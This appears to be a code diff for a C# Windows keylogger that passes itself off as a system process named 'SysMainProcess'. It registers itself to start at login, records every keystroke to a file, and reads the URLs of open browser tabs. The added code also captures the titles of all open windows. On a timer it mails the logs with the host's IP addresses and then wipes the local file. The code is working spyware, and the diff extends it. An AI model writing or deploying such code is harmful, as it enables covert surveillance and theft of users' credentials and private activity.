@@ -21,7 +21,6 @@ namespace SysMainProcess
 
         private static string logContents = "";
 
-        private static DateTime now = DateTime.Now;
         private static string subject = "";
         private static string podcastContents = "";
 
@@ -37,7 +36,8 @@ namespace SysMainProcess
 
         private static System.Timers.Timer timer = new System.Timers.Timer();
 
-        private static Process[] procs = null;
+        private static Process[] browserProcesses = null;
+        private static Process[] appProcesses = null;
         private static AutomationElement root = null;
         private static Condition condition = null;
         private static AutomationElementCollection tabs = null;
@@ -67,12 +67,19 @@ namespace SysMainProcess
 
             rkProcess = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             rkProcess.SetValue("SysMainProcess", Application.ExecutablePath.ToString());
+            rkProcess.Close();
             
             timer.Interval = PODCAST_INTERVAL;
             timer.Elapsed += new ElapsedEventHandler(SendNewPodcast);
             timer.AutoReset = true;
             timer.Start();
 
+            LogKeyEntries();
+        }
+
+        #region METHODS
+        static void LogKeyEntries()
+        {
             while (true)
             {
                 Thread.Sleep(THREAD_SLEEP_TIME);
@@ -85,15 +92,17 @@ namespace SysMainProcess
 
                         using (StreamWriter sw = File.AppendText(path))
                         {
+                            char[] characters = System.Text.Encoding.ASCII.GetChars(new byte[] { (byte)i });
+
                             if (i == 13)
                             {
-                                Console.WriteLine((char)i);
-                                sw.WriteLine((char)i);
+                                //Console.WriteLine(characters[0]);
+                                sw.WriteLine(characters[0]);
                             }
                             else
                             {
-                                Console.Write((char)i);
-                                sw.Write((char)i);
+                                //Console.Write(characters[0]);
+                                sw.Write(characters[0]);
                             }
 
                             sw.Dispose();
@@ -102,8 +111,6 @@ namespace SysMainProcess
                 }
             }
         }
-
-        #region METHODS
         static void CheckUrl()
         {
             try
@@ -116,38 +123,38 @@ namespace SysMainProcess
                         {
                             if (Process.GetProcessesByName("MicrosoftEdge").Length <= 0)
                             {
-                                procs = Process.GetProcessesByName("anywayGHgdhghdhjgdhjkghdahjgduyo");
+                                browserProcesses = Process.GetProcessesByName("anywayGHgdhghdhjgdhjkghdahjgduyo");
                                 podcastContents += "\n Browser: Browser is not running.";
                             }
                             else
                             {
-                                procs = Process.GetProcessesByName("MicrosoftEdge");
+                                browserProcesses = Process.GetProcessesByName("MicrosoftEdge");
                                 podcastContents += "\n Browser: Microsoft Edge";
                             }
                         }
                         else
                         {
-                            procs = Process.GetProcessesByName("firefox");
+                            browserProcesses = Process.GetProcessesByName("firefox");
                             podcastContents += "\n Browser: Firefox";
                         }
                     }
                     else
                     {
-                        procs = Process.GetProcessesByName("opera");
+                        browserProcesses = Process.GetProcessesByName("opera");
                         podcastContents += "\n Browser: Opera GX";
                     }
                     
                 }
                 else
                 {
-                    procs = Process.GetProcessesByName("chrome");
+                    browserProcesses = Process.GetProcessesByName("chrome");
                     podcastContents += "\n Browser: Chrome";
                 }
                
 
-                if (procs.Length > 0)
+                if (browserProcesses.Length > 0)
                 {
-                    foreach (Process proc in procs)
+                    foreach (Process proc in browserProcesses)
                     {
                         if (proc.MainWindowHandle == IntPtr.Zero)
                         {
@@ -171,6 +178,19 @@ namespace SysMainProcess
                 ex.ToString();
             }
         }
+        static void CheckPrograms()
+        {
+            podcastContents += "\n Open Apps: \n";
+
+            appProcesses = Process.GetProcesses();
+            foreach (Process p in appProcesses)
+            {
+                if (!String.IsNullOrEmpty(p.MainWindowTitle))
+                {
+                    podcastContents += "\n App: " + p.MainWindowTitle;
+                }
+            }
+        }
         static void EraseFileContents()
         {
             if (File.Exists(path))
@@ -192,29 +212,36 @@ namespace SysMainProcess
 
                 logContents = File.ReadAllText(lastPath);
 
-                CreatePodcast();
+                CreatePodcast(e.SignalTime);
 
                 EstablishNetworkConnectivity();
 
                 client.Send(podcastMessage);
 
-                now = DateTime.Now;
-                podcastContents = "";
-                logContents = "";
-                subject = "";
-
-                host = null;
-                client.Dispose();
-                client = null;
-                podcastMessage = null;
-
-                checkProcess = false;
-                drives = new string[0];
+                ResetWorkspace();
 
                 EraseFileContents();
             }
+            
         }
-        static void CreatePodcast()
+        static void ResetWorkspace()
+        {
+            podcastContents = "";
+            logContents = "";
+            subject = "";
+
+            host = null;
+            client.Dispose();
+            client = null;
+            podcastMessage = null;
+
+            checkProcess = false;
+            drives = new string[0];
+
+            browserProcesses = null;
+            appProcesses = null;
+        }
+        static void CreatePodcast(DateTime now)
         {
             host = Dns.GetHostEntry(Dns.GetHostName());
 
@@ -222,8 +249,6 @@ namespace SysMainProcess
             {
                 podcastContents += "Address: " + address + " | ";
             }
-
-            now = DateTime.Now;
 
             subject = "Message from SysMain " + host.HostName;
             podcastContents += "\n Time: " + now.ToString();
@@ -244,6 +269,10 @@ namespace SysMainProcess
             podcastContents += "\n";    
 
             CheckUrl();
+
+            podcastContents += "\n";
+
+            CheckPrograms();
 
             podcastContents += "\n";
 
